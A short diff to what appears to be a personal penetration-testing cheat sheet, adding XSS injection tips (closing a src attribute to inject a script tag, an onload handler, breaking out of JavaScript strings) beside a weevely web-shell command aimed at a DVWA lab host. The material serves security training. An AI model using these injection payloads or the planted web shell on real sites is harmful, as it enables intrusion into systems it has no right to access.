@@ -193,8 +193,10 @@ weevely http://192.168.136.131/dvwa/hackable/uploads/shell.php 123456
 [+] Scope: test COMMENTS, FEEDBACKS & SEARCH 
 [+] Check the string or parameter you are entrapped by inspecting webpage
 [+] Use "=javascript:alert(1)" within/if trapped in HREF argument or URL PATH
-[+] 
-
+- if trapped in an src tag, close the src tag and inject XSS e.g {"><script>alert(6)</script>}
+- or {"onload=alert(2)}
+[+] Use {';alert(5);//} --break out of a JS code
+[+} 
 
 *******************************
 ****INFORMATION GATHERING******
